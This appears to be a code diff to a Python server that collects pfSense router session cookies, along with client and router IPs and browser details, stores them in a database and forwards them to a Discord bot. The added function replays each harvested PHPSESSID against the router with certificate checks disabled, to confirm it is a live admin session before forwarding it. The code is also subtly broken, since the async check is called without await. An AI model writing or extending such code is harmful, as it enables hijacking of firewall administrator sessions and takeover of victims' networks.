@@ -5,6 +5,8 @@ import ssl
 import discord_bot
 import website_backend
 import threading
+import aiohttp
+import asyncio
 
 class LogHandler(BaseHTTPRequestHandler):
     def _send_cors_headers(self):
@@ -30,8 +32,10 @@ class LogHandler(BaseHTTPRequestHandler):
         
         if session_id:
             print("Session ID Received")
-            sqlworker.insert(client_ip, pfsense_ip, session_id, browser)
-            discord_bot.send_pfsense_id(client_ip, pfsense_ip, session_id, browser)
+            logged_in = verify_pfsense_session(pfsense_ip, session_id)
+            sqlworker.insert(client_ip, pfsense_ip, session_id, browser, logged_in)
+            if logged_in: 
+                discord_bot.send_pfsense_id(client_ip, pfsense_ip, session_id, browser)
             print(pfsense_ip)
             self.send_response(200)
             self._send_cors_headers()
@@ -39,6 +43,25 @@ class LogHandler(BaseHTTPRequestHandler):
         else:
             self.send_error(400, "Bad Request: Missing session ID")
             self._send_cors_headers()
+
+async def verify_pfsense_session(router_ip: str, phpsessid: str) -> bool:
+    """
+    Evaluates if a pfSense PHPSESSID represents a signed-in administrative session.
+    """
+    url = f"https://{router_ip}/status_interfaces.php"
+    cookies = {'PHPSESSID': phpsessid}
+    
+    # Disable SSL verification as lab routers typically utilize self-signed certs
+    connector = aiohttp.TCPConnector(ssl=False)
+    
+    async with aiohttp.ClientSession(connector=connector, cookies=cookies) as session:
+        # allow_redirects=False catches the immediate 302 on unauthenticated cookies
+        async with session.get(url, allow_redirects=False, timeout=3) as response:
+            if response.status == 200:
+                return True
+            elif response.status == 302 and 'index.php' in response.headers.get('Location', ''):
+                return False
+            return False
 
 def main():
     
